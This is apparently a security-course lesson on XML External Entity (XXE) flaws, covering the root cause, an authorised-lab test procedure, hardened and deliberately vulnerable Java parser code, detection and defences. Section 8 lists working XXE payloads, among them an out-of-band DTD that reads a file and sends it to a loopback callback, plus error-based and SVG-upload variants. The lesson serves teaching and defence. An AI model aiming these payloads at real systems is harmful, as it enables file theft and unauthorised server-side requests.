---
schema_version: 1
id: WEB-A05-XXE
title: "XML External Entities"
slug: xxe
level: intermediate
estimated_minutes: 50
prerequisites:
  - http-fundamentals
  - authorized-security-testing
owasp:
  - A02:2025
cwe:
  - CWE-611
content_status: technical-review
payload_status: static-verified
last_verified: null
---

# XML External Entities

> [!CAUTION]
> Only practice on systems you own or are explicitly authorized. Use synthetic data, disposable fixtures, and limit resources; do not send payloads to the Internet or real targets.

## 1. Learning Objectives

After this lesson, you can:

- Explain XML External Entities by root cause instead of just describing the consequence.
- Identify trust boundary, asset, actor, and necessary conditions for the vulnerability to be exploited.
- Conduct controlled testing in a local lab and distinguish expected results from false positives.
- Select root controls, implement the fix, and retest using positive, negative, and boundary cases.

## 2. Prerequisites

- Understand the flow of HTTP request/response in the situation XML External Entities and how to apply input handling across trust boundaries. 
- Distinguish between authentication, authorization, and validation. 
- Be able to read code/configuration in the language or framework appearing in the example. 
- Have an isolated local lab, synthetic data, observable logs, and clear testing permissions.

## 3. Background Knowledge

Think of XML as a way of organizing data in an orderly manner using tags (similar to HTML). In XML, there is a feature called entities, which works like creating shortcuts or declaring a variable to reuse multiple times. However, XML also supports external entities using the `SYSTEM` keyword along with a path. When processing this XML document, the parser (XML parser) will automatically go to that path to load the content and insert it at the entity location. This path can point to a file on the server or a webpage on the internet.

```java
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;

public class SecureXmlParser {
    public static DocumentBuilderFactory createSecureParserFactory() throws ParserConfigurationException {
        // Create a new DocumentBuilderFactory instance
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();

        // Disable DTD (Document Type Definitions) completely to prevent XXE attacks
        // The parser will throw an exception if a DOCTYPE declaration is encountered.
        String disallowDtdFeature = "http://apache.org/xml/features/disallow-doctype-decl";
        factory.setFeature(disallowDtdFeature, true);

        // Additional security hardening: disable XInclude and entity expansion
        factory.setXIncludeAware(false);
        factory.setExpandEntityReferences(false);

        return factory;
    }
}
```

## 4. Description and Root Cause

The XML External Entity (XXE) vulnerability occurs when an application uses the XML parser that allows DTD/external entities with untrusted data. Consequences may include reading resources that the process has access to, making server-side requests, or consuming resources. In the lab of this lesson, all file access uses only `file:///fixtures/lab-secret.txt`, callbacks are bound only to the loopback, and the parser runs in a restricted container; it does not read real system files or scan network services. [S1]

> **Reference:** technical claims in the lesson are marked with a source; when applying in practice, compare with the version/framework being used: [S1], [S2], [S3], [S4].

## 5. Threat Model and Exploitation Conditions

- **Assets:** aggregated file marker, XML parser, and network reachability.  
- **Actor, authentication, and role:** user role uploads XML/SVG or calls XML API.  
- **Exploitation conditions:** DTD/external entity resolution according to file/URL as controlled by document.  
- **Browser, proxy, framework, and version:** Java 17 DocumentBuilder with pinned feature, aggregated file and callback 127.0.0.1; no outbound; must record actual image/package version along with evidence.  
- **Mandatory evidence:** with correlation ID must link input, control decisions, and impact on the correct asset; individual status code is not enough. [S1]

## 6. Attack Mechanism

For xxe, DTD/external entity resolution according to file/URL controlled by the document. The positive case must prove the input reaches the correct sink and creates the described effect; the negative case, when root control is enabled, must be blocked before any side effect. The conclusion only applies to the environment pinned in item 5. [S1]

## 7. Testing in an Authorized Lab

1. **Setup:** launch Java 17 DocumentBuilder with the pinned feature, aggregate file, and callback 127.0.0.1; no outbound; only load aggregate data, enable application/proxy/datastore logging, and attach correlation ID.
2. **Baseline:** send a valid input for the XXE use case; save raw request/response, decide on policy and asset status before the test.
3. **Input and operations:** use exactly one core payload from item 8 in the annotated context; change one variable at a time and comply with the request cap.
4. **Expected result:** only consider the vulnerable fixture as positive if logs prove the “DTD/external entity resolution via file/URL controlled by document” mechanism; secure fixture must block side effects beforehand and boundary inputs must fail closed.
5. **Cleanup:** delete XXE data, markers, and logs; reclaim related session/cache, revert snapshot, and confirm no remaining callbacks/test processes.
6. **Safety limits:** run only on loopback/`.lab.test`; do not use real targets, credentials, or data; OOB/DoS/state-changing operations must have network/CPU/memory/request caps.

## 8. Payloads and Scope of Applicability

The blocks below are minimal lab examples according to the context recorded in the annotation. Before use, check the framework/version, encoding, expected result, and risk; only run in an authorized local fixture. Extended payload belongs to `security_cheatsheet.md`; lessons only retain the core examples.

Common XXE attack variants include:

*   **Blind XXE (Out-of-Band - OOB)**: When the application does not return the XML resolution result in the HTTP response, the attacker uses an external DTD to send data to a peripheral server via DNS or HTTP.
    *   *Payload sent to the application*:<!-- payload-id: WEB-A05-XXE-001 -->
<!-- context: XML 1.0 parsed by an intentionally vulnerable local fixture with external parameter entities enabled -->
<!-- prerequisites: DTD server bound to 127.0.0.1:9001; outbound network disabled; request limit 2; synthetic fixture file only -->
<!-- encoding: UTF-8 XML; the DTD URL is literal ASCII -->
<!-- expected-result: the parser makes one loopback GET for /evil.dtd and the fixture log records external-entity resolution -->
<!-- risk: oob -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
        ```xml
        <!DOCTYPE foo [
          <!ENTITY % dtd SYSTEM "http://127.0.0.1:9001/evil.dtd">
          %dtd;
        ]>
        <foo>&exfil;</foo>
        ```
*   *Content of the `evil.dtd` file on the attacker's server*: <!-- payload-id: WEB-A05-XXE-002 -->
<!-- context: external DTD consumed by the XML fixture used by WEB-A05-XXE-001 -->
<!-- prerequisites: /fixtures/lab-secret.txt contains only XXE_LAB_MARKER; callback bound to 127.0.0.1:9001; outbound network disabled -->
<!-- encoding: UTF-8 DTD; fixture marker contains URL-safe ASCII only -->
<!-- expected-result: callback receives one GET /collect?data=XXE_LAB_MARKER and no non-loopback connection occurs -->
<!-- risk: oob -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
        ```xml
        <!ENTITY % file SYSTEM "file:///fixtures/lab-secret.txt">
        <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://127.0.0.1:9001/collect?data=%file;'>">
        %eval;
        ```
*   **Parameter Entity XXE**: Use the parameter entity (starting with `%`) to define nested structures in DTD, helping to overcome syntax limitations of the internal XML parser.
    *   *Payload*:<!-- payload-id: WEB-A05-XXE-003 -->
<!-- context: XML 1.0 parser fixture with parameter entities and local file URIs intentionally enabled -->
<!-- prerequisites: /fixtures/lab-secret.txt contains only XXE_LAB_MARKER; parser errors are captured locally; no outbound network -->
<!-- encoding: UTF-8 XML and DTD; marker is ASCII -->
<!-- expected-result: the controlled parser error contains XXE_LAB_MARKER and no host file is accessed -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
        ```xml
        <!DOCTYPE foo [
          <!ENTITY % file SYSTEM "file:///fixtures/lab-secret.txt">
          <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
          %eval;
        ]>
        ```
*   **XXE via File Upload**: The attacker uploads file formats based on XML such as SVG (vector graphics) or DOCX (Word text) containing malicious entities.
    *   *Payload SVG contains XXE*:<!-- payload-id: WEB-A05-XXE-004 -->
<!-- context: SVG 1.1 processed by an intentionally vulnerable XML parser, not direct browser rendering -->
<!-- prerequisites: /fixtures/lab-secret.txt contains only XXE_LAB_MARKER; upload processor runs in a disposable container without outbound network -->
<!-- encoding: UTF-8 XML/SVG -->
<!-- expected-result: generated SVG text contains XXE_LAB_MARKER; a hardened parser rejects the DOCTYPE -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
        ```xml
        <?xml version="1.0" standalone="yes"?>
        <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///fixtures/lab-secret.txt" > ]>
        <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
          <text font-size="16" x="0" y="16">&xxe;</text>
        </svg>
        ```
*   **Error-based XXE**: The attacker deliberately generates a syntax error or a resource loading error in which the system's error message contains the sensitive file content that needs to be read.
    *   *Payload*:<!-- payload-id: WEB-A05-XXE-005 -->
<!-- context: XML 1.0 parser fixture that exposes controlled entity-resolution errors -->
<!-- prerequisites: /fixtures/lab-secret.txt contains only XXE_LAB_MARKER; error output is local and disposable; no outbound network -->
<!-- encoding: UTF-8 XML and DTD; marker is ASCII -->
<!-- expected-result: fixture error includes XXE_LAB_MARKER; secure parser rejects the DOCTYPE before resolving the file URI -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
        ```xml
        <!DOCTYPE foo [
          <!ENTITY % file SYSTEM "file:///fixtures/lab-secret.txt">
          <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///invalid/%file;'>">
          %eval;
          %error;
        ]>
        ```

## 9. Vulnerable Code and Secure Code

```java
// === VULNERABLE CODE (Java DocumentBuilder) ===
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import org.xml.sax.InputSource;
import java.io.StringReader;

public class XmlParserVulnerable {
    public void parse(String xmlInput) throws Exception {
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        // DANGER: By default, DocumentBuilderFactory resolves external entities and DTDs
        DocumentBuilder db = dbf.newDocumentBuilder();
        db.parse(new InputSource(new StringReader(xmlInput)));
    }
}

// === SECURE CODE (Java DocumentBuilder) ===
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;

public class XmlParserSecure {
    public void parse(String xmlInput) throws Exception {
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();

        // SECURE: Disable DTD declarations completely
        dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

        // SECURE: Disable external entities if DTDs cannot be fully disabled
        dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
        dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

        DocumentBuilder db = dbf.newDocumentBuilder();
        db.parse(new InputSource(new StringReader(xmlInput)));
    }
}
```

## 10. Detection

- Log the actor/session, route or operation, object/resource related to XML External Entities, policy results and correlation ID; do not log secrets or full tokens.
- Compare authorization/validation failures with the valid baseline and alert according to behavior chains, not just a single payload chain.
- Combine application telemetry, reverse proxy, and datastore to confirm that the request reached the sink and whether or not there was an impact.
- The scanner or WAF alert is only an investigation signal; it is not the sole evidence that a vulnerability exists. [S1]

## 11. Defense

### Compulsory control

- Disable DTD, external entity, and external access on all XML parser factories.
- Apply the same controls to all routes, operations, and equivalent processing paths; failure must stop before side effects.

### Defense-in-depth

For XML External Entities, the measures below help reduce the blast radius or increase detection capability. Rate limit, UUID hard to predict, WAF, CSP, or general validation should not be used as a substitute for original controls.

- **Summary**: Disable DTD and external entities on all XML parsers used in the application.  
- **Detailed steps**:  
  - Configure to disable the `disallow-doctype-decl` feature in Java, or disable `resolve_entities` and `external_dtd` in Python/PHP.  
  - Sanitize uploaded files (SVG, DOCX) before processing, or use default secure parsing libraries such as `defusedxml` in Python.  
  - Use safer data exchange formats such as JSON whenever possible.

## 12. Retest

- **Positive case:** with XML External Entities, the valid flow still works correctly for the actor and allowed data.  
- **Negative case:** with the same input/resource but the actor or context is not allowed, it should be rejected without leaking sensitive details.  
- **Boundary case:** check empty values, extreme values, different encodings, repeated requests, expired session states, and equivalent paths/operations.  
- **Telemetry:** confirm that policy decisions, application logs, proxy logs, and datastore side effects match correlation ID.  
- **Recheck:** save a minimal scenario that reproduces the old error and proves the fix does not depend on WAF/rate limit.

## 13. Common Mistakes

- Only check the status code or response string of XML External Entities without verifying side effects and logs.  
- Use a payload with the correct syntax but wrong DBMS, browser, framework, protocol, or injection context.  
- Treat UUID, rate limit, WAF, CSP, or general input validation as fixed by another root control.  
- Only fix one route while the same sink/policy is used in another route.  
- Conclude that a vulnerability exists without recording the source, fixture version, and observable evidence.

## 14. Summary and Checklist

- [ ] Root cause, consequences, and exploitation techniques have been separated.  
- [ ] Actor, role/authentication, trust boundary, technology, and version are clear.  
- [ ] Payload has a unique ID, context, encoding, conditions, expected result, risk, validation, and source.  
- [ ] Code prone to errors/unsafe uses the same framework, version, and use case.  
- [ ] Mandatory controls cannot be replaced with defense-in-depth.  
- [ ] Positive, negative, boundary cases, and telemetry have been retested.  
- [ ] Sensitive technical claims have references in section 17, and all links are only in sections 16–17.  
- [ ] Cleanup completed; no secrets, real targets, Internet callbacks, or customer data remain.

## 15. Glossary

- **XXE (XML External Entity)**: Security vulnerability related to the external entity XML, allowing unauthorized file reading or network requests. 
- **DTD (Document Type Definition)**: A set of rules defining the structure of an XML document. 
- **XML Entity**: An entity that acts as a constant or a variable to reuse data in XML. 
- **XML Parser**: A processor that helps parse and construct the structure of an XML document. 
- **SSRF (Server-Side Request Forgery)**: An attack that forges requests from the server side, causing the server to send network queries to other addresses.

## 16. Related Lessons and Further Reading

- [XML Bombs](../../10-exceptional-conditions/xml-bombs/) — Denial of service attack techniques (DoS) exploiting the entity expansion mechanism XML to consume server memory (Billion Laughs attack). 
- [Server-Side Request Forgery](../../01-broken-access-control/ssrf/) — Vulnerability of forged requests from the server side, often combined with XXE to scan ports or send internal queries.

## 17. References

- **[S1]** PortSwigger. https://portswigger.net/web-security/xxe — version/status: current version; accessed: 2026-07-17.  
- **[S2]** OWASP. https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html — version/status: current version; accessed: 2026-07-17.  
- **[S3]** CWE. https://cwe.mitre.org/data/definitions/611.html — version/status: current version; accessed: 2026-07-17.  
- **[S4]** OWASP Top 10:2025. https://owasp.org/Top10/2025/ — version/status: current version; accessed: 2026-07-17.